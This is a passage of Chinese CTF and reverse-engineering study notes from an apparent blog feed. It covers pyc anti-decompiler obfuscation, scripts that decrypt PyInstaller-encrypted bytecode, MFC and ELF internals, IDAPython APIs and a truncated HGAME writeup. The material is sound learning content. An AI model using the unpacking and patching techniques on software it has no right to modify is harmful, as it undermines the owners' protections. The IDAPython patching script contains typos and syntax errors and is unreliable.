class="number">0</span> (i)</span><br><span class="line"><span class="number">20</span> JUMP_ABSOLUTE <span class="number">4</span></span><br></pre></td></tr></table></figure><p>对应 python 代码：</p><p>i &#x3D; 0</p><p>while i &lt; 10:</p><p>i +&#x3D; 1</p><h4 id="for…in-结构"><a href="#for…in-结构" class="headerlink" title="for…in 结构"></a><strong>for…in</strong> <strong>结构</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204125219815.png" alt="image-20240204125219815"></p><p>对应 python 代码：</p><p>for i in range(10):</p><p>print(i ^ 3)</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a><strong>函数</strong></h3><h4 id="函数范围"><a href="#函数范围" class="headerlink" title="函数范围"></a><strong>函数范围</strong></h4><p>前面介绍第二列表示指令在函数中的偏移地址，所以看到 0 就是函数开始，下一个 0 前一条指令就是函</p><p>数结束位置，当然也可以通过 RETURN_VALUE 来确定函数结尾。</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a><strong>函数调用</strong></h4><p>函数调用类似于 push + call 的汇编结构，压栈参数从左到右依次压入（当然不是 push ，而是读取</p><p>指令 LOAD_xxxx 来指定参数）。</p><p>先指定要调用的函数（ LOAD_NAME 或 LOAD_GLOBAL ），然后压参数，最后通过 CALL_FUNCTION 调</p><p>用。</p><p>CALL_FUNCTION 后面的值表示有几个参数。</p><p>支持嵌套调用</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204125253249.png" alt="image-20240204125253249"></p><p>对应的 python 代码为：</p><p>n &#x3D; 100</p><p>root &#x3D; int(math.sqrt(n))</p><h2 id="pyc-加花混淆"><a href="#pyc-加花混淆" class="headerlink" title="pyc 加花混淆"></a><strong>pyc</strong> <strong>加花混淆</strong></h2><p>由上面的版块我们知道 pyc 是可以反编译的，而且目前也有现成的工具。但这些工具它会将每一个指令</p><p>都解析出来，所以字节码混淆的方式就是往里面插入一些恶意指令（比如加载超出范围的数据），让反</p><p>编译工具在解析的时候报错，从而失去作用。</p><p>但插入的恶意指令还不能影响解释器执行，因此还要插入一些跳转指令，从而让解释器跳过恶意指令。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204125318308.png" alt="image-20240204125318308"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204194442966.png" alt="image-20240204194442966"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204194452686.png" alt="image-20240204194452686"></p><h2 id="pyinstaller-应用"><a href="#pyinstaller-应用" class="headerlink" title="pyinstaller 应用"></a><strong>pyinstaller</strong> <strong>应用</strong></h2><h3 id="普通打包"><a href="#普通打包" class="headerlink" title="普通打包"></a><strong>普通打包</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200105807.png" alt="image-20240204200105807"></p><h4 id="exe逆向"><a href="#exe逆向" class="headerlink" title="exe逆向"></a>exe逆向</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200135481.png" alt="image-20240204200135481"></p><h4 id="elf逆向"><a href="#elf逆向" class="headerlink" title="elf逆向"></a>elf逆向</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200150021.png" alt="image-20240204200150021"></p><h3 id="使用-key-参数打包"><a href="#使用-key-参数打包" class="headerlink" title="使用 key 参数打包"></a><strong>使用</strong> <strong>key</strong> <strong>参数打包</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200214641.png" alt="image-20240204200214641"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200221556.png" alt="image-20240204200221556"></p><h4 id="version-lt-4-0"><a href="#version-lt-4-0" class="headerlink" title="version &lt; 4.0"></a><strong>version &lt; 4.0</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For pyinstaller &lt; 4.0</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">CRYPT_BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"><span class="comment"># key obtained from pyimod00_crypto_key</span></span><br><span class="line">key = <span class="string">&#x27;this_is_a_secret&#x27;</span></span><br><span class="line">inf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc.encrypted&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># encrypted file input</span></span><br><span class="line">outf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="comment"># output file</span></span><br><span class="line"><span class="comment"># Initialization vector</span></span><br><span class="line">iv = inf.read(CRYPT_BLOCK_SIZE)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line"><span class="comment"># Decrypt and decompress</span></span><br><span class="line">plaintext = zlib.decompress(cipher.decrypt(inf.read()))</span><br><span class="line"><span class="comment"># Write pyc header</span></span><br><span class="line"><span class="comment"># The header below is for Python 2.7</span></span><br><span class="line">outf.write(<span class="string">&#x27;\x03\xf3\x0d\x0a\0\0\0\0&#x27;</span>)</span><br><span class="line"><span class="comment"># Write decrypted data</span></span><br><span class="line">outf.write(plaintext)</span><br><span class="line">inf.close()</span><br><span class="line">outf.close()</span><br></pre></td></tr></table></figure><h4 id="version-gt-x3D-4-0"><a href="#version-gt-x3D-4-0" class="headerlink" title="version &gt;&#x3D; 4.0"></a><strong>version &gt;&#x3D; 4.0</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For pyinstaller &gt;= 4.0</span></span><br><span class="line"><span class="keyword">import</span> tinyaes</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">CRYPT_BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"><span class="comment"># key obtained from pyimod00_crypto_key</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">&#x27;this_is_a_secret&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">inf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc.encrypted&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># encrypted file input</span></span><br><span class="line">outf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="comment"># output file</span></span><br><span class="line"><span class="comment"># Initialization vector</span></span><br><span class="line">iv = inf.read(CRYPT_BLOCK_SIZE)</span><br><span class="line">cipher = tinyaes.AES(key, iv)</span><br><span class="line"><span class="comment"># Decrypt and decompress</span></span><br><span class="line">plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))</span><br><span class="line"><span class="comment"># Write pyc header</span></span><br><span class="line"><span class="comment"># The header below is for Python 3.8</span></span><br><span class="line">outf.write(<span class="string">b&#x27;\x55\x0d\x0d\x0a\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span>)</span><br><span class="line"><span class="comment"># Write decrypted data</span></span><br><span class="line">outf.write(plaintext)</span><br><span class="line">inf.close()</span><br><span class="line">outf.close()</span><br></pre></td></tr></table></figure><p>反编译 pyimod02_archive.pyc ：</p><p>pyinstaller &lt; 4.0 &#x3D;&gt; pycrypto &amp; CFB</p><p>pyinstaller &gt;&#x3D; 4.0 &#x3D;&gt; tinyaes &amp; CTR</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python逆向&quot;&gt;&lt;a href=&quot;#Python逆向&quot; class=&quot;headerlink&quot; title=&quot;Python逆向&quot;&gt;&lt;/a&gt;Python逆向&lt;/h1&gt;&lt;h2 id=&quot;pyc文件&quot;&gt;&lt;a href=&quot;#pyc文件&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="python 逆向" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/python-%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/03/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/03/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/</id>
    <published>2024-02-03T03:42:48.110Z</published>
    <updated>2024-02-04T04:24:55.708Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><h1 id="MFC图形化界面"><a href="#MFC图形化界面" class="headerlink" title="MFC图形化界面"></a>MFC图形化界面</h1><h2 id="windows桌面应用编程"><a href="#windows桌面应用编程" class="headerlink" title="windows桌面应用编程"></a>windows桌面应用编程</h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202804698.png" alt="image-20240203202804698"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202813056.png" alt="image-20240203202813056"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202823482.png" alt="image-20240203202823482"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202851227.png" alt="image-20240203202851227"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202903575.png" alt="image-20240203202903575"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202911473.png" alt="image-20240203202911473"></p><h2 id="MFC-正向开发"><a href="#MFC-正向开发" class="headerlink" title="MFC 正向开发"></a><strong>MFC</strong> <strong>正向开发</strong></h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202925910.png" alt="image-20240203202925910"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202934106.png" alt="image-20240203202934106"></p><h2 id="逆向思路"><a href="#逆向思路" class="headerlink" title="逆向思路"></a><strong>逆向思路</strong></h2><ul><li><p>通过 ResourceHacker 可以获取控件的 ID 号、修改控件布局等</p></li><li><p>通过 xspy 可以获取控件消息所对应的处理函数地址</p></li><li><p>通过 GetDlgItem &#x2F; GetDlgItemText &#x2F; GetDlgItemInt &#x2F; GetWindowText 系列 API 找到关键函数</p></li></ul><p>找到关键函数后，即为常规逆向</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;hr&gt;
&lt;h1 id=&quot;MFC图形化界面&quot;&gt;&lt;a href=&quot;#MFC图形化界面&quot; class=&quot;headerlink&quot; title=&quot;MFC图形化界面&quot;&gt;&lt;/a&gt;MFC图形化界面&lt;/h1&gt;&lt;h2 id=&quot;windows桌面应用编程&quot;&gt;&lt;a href=&quot;#window</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>IDAPython常用函数</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/01/IDAPython%E4%B8%8Eelf%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/01/IDAPython%E4%B8%8Eelf%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/</id>
    <published>2024-01-31T16:00:00.000Z</published>
    <updated>2024-02-03T12:27:33.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDAPython常用函数"><a href="#IDAPython常用函数" class="headerlink" title="IDAPython常用函数"></a>IDAPython常用函数</h1><p><a href="https://hex-rays.com/products/ida/support/idapython_docs/">官方文档</a></p><h2 id="基础API"><a href="#基础API" class="headerlink" title="基础API"></a>基础API</h2><ul><li>here() &#x2F; get_screen_ea()：返回光标当前所在地址</li><li>get_inf_attr(INF_MIN_EA) &#x2F; get_inf_attr(INF_MAX_EA)：获得最小 &#x2F; 最大地址</li><li>generate_disasm_line(ea, GENDSM_FORCE_CODE)：获得 ea 所在处的一条汇编指令</li><li>print_insn_mnem(ea)：获得 ea 所在处的指令助记符</li><li>print_operand(ea, n)：获取 ea 所在处的第 n 个操作数</li></ul><h2 id="段"><a href="#段" class="headerlink" title="段"></a>段</h2><ul><li>Segments()：返回段的可遍历对象</li><li>get_segm_name(ea)：获得 ea 所在段名</li><li>get_next_seg(ea)：获取下一个段</li><li>get_segm_start(ea) &#x2F; get_segm_end(ea)：获取段开始 &#x2F; 结束地址</li></ul><p>for seg in Segments():</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f&quot;&#123;get_segm_name(seg)&#125;, &#123;get_segm_start(seg)&#125;, &#123;get_segm_end(seg)&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>Functions() &#x2F; Funtions(start_addr, end_addr)：返回函数的可遍历对象</p><p>get_func_name(ea)：返回函数名称</p><p>idaapi.get_func(ea)：获得解析后的函数对象</p><p>get_func_attr(ea, FUNCATTR_START) &#x2F; get_func_attr(ea, FUNCATTR_END)：访问函数边界</p><p>get_next_func(ea) &#x2F; get_prev_func(ea)：获取上 &#x2F; 下一个函数</p><p>prev_head(ea) &#x2F; next_head(ea)：获得上 &#x2F; 下一条指令地址</p><p>FuncItems(ea)：获取 ea 所处函数的所有指令地址</p><p>eg:打印一个函数的反汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ea = here()</span><br><span class="line">now = get_func_attr(ea, FUNCATTR_START)</span><br><span class="line">end = get_func_attr(ea, FUNCATTR_END)</span><br><span class="line">while now &lt; end:</span><br><span class="line">print(f&quot;0x&#123;now&#125; &#123;generate_disasm_line(now, 0)&#125;&quot;)</span><br><span class="line">now = next_head(now)</span><br></pre></td></tr></table></figure><p>使用 FuncItems 来完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for ea in FuncItems(here()):</span><br><span class="line">print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>idaapi.decode_insn(out, ea)：解析指令并填充 out (insn_t 结构体)</p><p>ida_ua.insn_t()：new 一个 insn_t 结构体</p><p>例：找到函数中所有的跳转指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for ea in FuncItems(here()):</span><br><span class="line">asm = generate_disasm_line(ea, 0)</span><br><span class="line">if &quot;jmp&quot; in asm:</span><br><span class="line">print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br></pre></td></tr></table></figure><p>另一种实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMPS = [idaapi.NN_jmp, idaapi.NN_jmpfi, idaapi.NN_jmpni]</span><br><span class="line">for ea in FuncItems(here()):</span><br><span class="line">ins = ida_ua.insn_t()</span><br><span class="line">idaapi.decode_insn(ins, ea)</span><br><span class="line">if ins.itype in JMPS:</span><br><span class="line">print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a><strong>操作数</strong></h2><p>可以使用 get_operand_type(ea, n) 得到操作数的类型。get_operand_value(ea, n) 来得到操作数的值。ea 是地址，n 是索引。</p><p>这里有 8 中不同类型的操作数类型。</p><p><strong>o_void</strong> 如果一个指令没有任何操作数它将返回 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa09166 retn</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 0</span><br></pre></td></tr></table></figure><p><strong>o_reg</strong> 如果一个操作数是一个普遍的寄存器将返回此类型。这个值在内部表示为 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa09163 pop edi</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 1</span><br></pre></td></tr></table></figure><p><strong>o_mem</strong> 如果一个操作数是直接内存引用它将返回这个类型。这个值在内部表示为 2。这种类型是有用的在 DATA 段查找引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa05d86 cmp ds:dword_A152B8, 0</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 2</span><br></pre></td></tr></table></figure><p><strong>o_phrase</strong> 这个操作数被返回则这个操作数包含一个基本的寄存器或一个索引寄存器。这个值在内部表示为 3。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0x1000b8c2 mov [edi+ecx], eax</span><br><span class="line">Python&gt;print(get_operand_type(ea,0))</span><br><span class="line">&gt;&gt;&gt; 3</span><br></pre></td></tr></table></figure><p><strong>o_displ</strong> 这个操作数被返回则操作数包含寄存器和一个位移值，这个为位移值是一个整数，例如 0x18。</p><p>这是常见的当一条指令访问值在一个结构中。在内部，它表示为 4 的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa05dc1 mov eax, [edi+18h]</span><br><span class="line">Python&gt;print(get_operand_type(ea,1))</span><br><span class="line">&gt;&gt;&gt; 4</span><br></pre></td></tr></table></figure><p><strong>o_imm</strong> 操作数是这样一个为整数的 0xc 的值的类型。它在内部表示为 5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;print(f&quot;0x&#123;hex(ea)&#125; &#123;generate_disasm_line(ea, 0)&#125;&quot;)</span><br><span class="line">&gt;&gt;&gt; 0xa05da1 add esp, 0Ch</span><br><span class="line">Python&gt;print(get_operand_type(ea,1))</span><br><span class="line">&gt;&gt;&gt; 5</span><br></pre></td></tr></table></figure><p><strong>o_far</strong> 是用来寻找操作数的访问立即数远地址的。它在内部表示为 6。</p><p><strong>o_near</strong> 是用来寻找操作数的访问立即数近地址的。它在内部表示为 7。</p><h2 id="数据读写"><a href="#数据读写" class="headerlink" title="数据读写"></a>数据读写</h2><ul><li>get_bytes(ea, size)</li><li>ida_bytes.get_byte(ea)</li><li>ida_bytes.get_word(ea)</li><li>ida_bytes.get_dword(ea)</li><li>ida_bytes.get_qword(ea)</li><li>ida_bytes.patch_bytes(ea, buf)</li><li>ida_bytes.patch_byte(ea, val)</li><li>ida_bytes.patch_word(ea, val)</li><li>ida_bytes.patch_dword(ea, val)</li><li>ida_bytes.patch_qword(ea, val)</li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ul><li>add_bpt(ea)：添加断点</li><li>del_bpt(ea)：删除断点</li><li>start_process(path, args, sdir)：启动调试</li><li>step_into()：步入</li><li>step_over()：步过</li><li>step_until_ret()：执行到返回</li><li>get_reg_value(regname)：获取寄存器值</li><li>set_reg_value(value, regname)：设置寄存器值</li><li>wait_for_next_event(wfne, timeout)：等待调试事件，第一个参数一般取为 WFNE_SUSP</li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">addr= <span class="number">0x401198</span></span><br><span class="line">end = get_func_attr(addr,FUNCATTR_END)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr&lt;end:</span><br><span class="line">    next_ins=next_head(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;dword_603054&quot;</span> <span class="keyword">in</span> generate_disasm_line(addr,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            addr = next_dead(addr)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;jnz&quot;</span> <span class="keyword">in</span> generate_disasm_line(addr,<span class="number">0</span>):</span><br><span class="line">                dest = get _operand_value(addr,<span class="number">0</span>)</span><br><span class="line">                offset = dest-(addr+<span class="number">5</span>)</span><br><span class="line">                <span class="built_in">print</span>(offset)</span><br><span class="line">                </span><br><span class="line">                ida_bytes.patch_byte(addr,<span class="number">0xE9</span>)</span><br><span class="line">                addr = next_ins</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addr=next_ins</span><br></pre></td></tr></table></figure><h1 id="ELF-运行流程"><a href="#ELF-运行流程" class="headerlink" title="ELF 运行流程"></a><strong>ELF</strong> 运行流程</h1><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240201223812328.png" alt="image-20240201223812328"></p><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a><strong>动态链接</strong></h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240201223823579.png" alt="image-20240201223823579"></p><h2 id="基本操作说明"><a href="#基本操作说明" class="headerlink" title="基本操作说明"></a><strong>基本操作说明</strong></h2><h3 id="sys-execve"><a href="#sys-execve" class="headerlink" title="sys_execve"></a><strong>sys_execve</strong></h3><p>该函数主要用于执行一个新的程序，即执行我们想要执行的程序，会检查相应的 argv 以及 envp 等参</p><p>数。</p><h3 id="do-execve"><a href="#do-execve" class="headerlink" title="do_execve"></a><strong>do_execve</strong></h3><p>该函数打开目标映像文件，并从目标文件的开始处读入指定长度的（目前为128）字节来获取相应目标</p><p>文件的基本信息。</p><h3 id="search-binary-handler"><a href="#search-binary-handler" class="headerlink" title="search_binary_handler"></a><strong>search_binary_handler</strong></h3><p>该函数会搜索支持处理当前类型的二进制文件类型队列，以便于让各种可执行程序的处理程序进行相应</p><p>的处理。</p><h3 id="load-elf-binary"><a href="#load-elf-binary" class="headerlink" title="load_elf_binary"></a><strong>load_elf_binary</strong></h3><p>该函数的主要处理流程如下</p><ul><li><p>-检查并获取 elf 文件的头部信息</p></li><li><p>如果目标文件采用动态链接，则使用 .interp 节来确定 loader 的路径。</p></li><li><p>将 program header 中记录的相应的段映射到内存中。program header 中有以下重要信息</p><ul><li>每一个段需要映射到的地址</li><li>每一个段相应的权限</li><li>记录哪些节属于哪些段</li></ul></li></ul><p>具体的映射如下</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240201223854316.png" alt="image-20240201223854316"></p><p>分情况处理</p><ul><li><p>动态链接情况下，将 sys_execve 的返回地址改为 loader(ld.so) 的 entry point</p></li><li><p>静态链接情况下，将 sys_execve 的返回地址改为程序的入口点</p></li></ul><h3 id="ld-so"><a href="#ld-so" class="headerlink" title="ld.so"></a><strong>ld.so</strong></h3><p>该文件有以下功能</p><ul><li>主要用于载入 ELF 文件中 DT_NEED 中记录的共享库</li><li>初始化工作</li><li>初始化 GOT 表</li><li>将 symbol table 合并到 global symbol table</li></ul><h3 id="start"><a href="#start" class="headerlink" title="_start"></a><strong>_start</strong></h3><ul><li>_start 函数会将以下项目交给 libc_start_main</li><li>环境变量起始地址</li><li>.init</li><li>启动 main 函数前的初始化工作</li><li>.fini</li><li>程序结束前的收尾工作</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDAPython常用函数&quot;&gt;&lt;a href=&quot;#IDAPython常用函数&quot; class=&quot;headerlink&quot; title=&quot;IDAPython常用函数&quot;&gt;&lt;/a&gt;IDAPython常用函数&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://hex-rays.</summary>
      
    
    
    
    
    <category term="IDA Python" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/IDA-Python/"/>
    
  </entry>
  
  <entry>
    <title>最近打的一些比赛</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/31/%E6%9C%80%E8%BF%91%E6%89%93%E6%AF%94%E8%B5%9B%E7%9A%84%E4%B8%80%E4%BA%9Bwriteup/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/31/%E6%9C%80%E8%BF%91%E6%89%93%E6%AF%94%E8%B5%9B%E7%9A%84%E4%B8%80%E4%BA%9Bwriteup/</id>
    <published>2024-01-30T16:00:00.000Z</published>
    <updated>2024-02-04T11:58:25.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HGAME-20240129"><a href="#HGAME-20240129" class="headerlink" title="HGAME 20240129"></a>HGAME 20240129</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>日常关注微信号–flag</p><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p>侧着看着图片w（经典</p><h3 id="simple——attack"><a href="#simple——attack" class="headerlink" title="simple——attack"></a>simple——attack</h3><p>明文爆破zip</p><h3 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h3><p>六位弱加密</p><h3 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h3><p>希尔加密，但是图片怎么修复？</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h3><p>打开IDA就是</p><h3 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h3><p>UPX脱壳，看伪代码，</p><p>flag xor 0x32 后为一个数组</p><p>写入010editor，转换一下就出来了</p><p>（一定要抄对（（别抄，直接shift e导出（（</p><h3 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h3><p>根据汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 